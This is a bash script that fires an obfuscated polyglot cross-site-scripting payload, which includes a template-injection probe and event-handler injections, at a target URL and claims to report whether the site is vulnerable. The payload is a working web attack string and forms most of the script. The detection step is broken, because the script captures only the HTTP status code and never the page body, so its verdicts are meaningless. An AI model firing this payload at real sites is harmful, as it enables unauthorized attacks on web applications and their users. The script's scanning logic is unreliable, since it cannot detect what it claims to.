#!/bin/bash

# Set the target URL
target_url="http://example.com"

# Set the XSS payload
xss_payload="*/onmouseover=(print)?.()><sVg/oNload='1>(_=prompt,_\\`{{7*7}}\\`)'></sTyle/</scRIpt/</textArea/</noScript/</tiTle/-->%EF%BC%9Ch1/<h1><image/onerror='alert%601%60%27'src>xhzeem%22%3E%3CSvg/\u0022\u003e\u003csVg/\x22\x3e\x3csVg/&quot;&gt;&lt;svG/onload=alert%602%60//"

# Extract the domain name from the target URL
domain_name=$(echo $target_url | awk -F[/:] '{print $4}')

# Make the HTTP request with the XSS payload
response=$(curl -s -o /dev/null -w "%{http_code}" -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3" -H "Referer: $target_url" "$target_url/$xss_payload")

# Check if the response contains the XSS payload
if [[ $response == *"49"* ]] || [[ $response == *"alert\`1\`"* ]] || [[ $response == *"alert\`2\`"* ]]; then
    echo "XSS vulnerability found in $domain_name"
else
    echo "No XSS vulnerability found in $domain_name"
fi
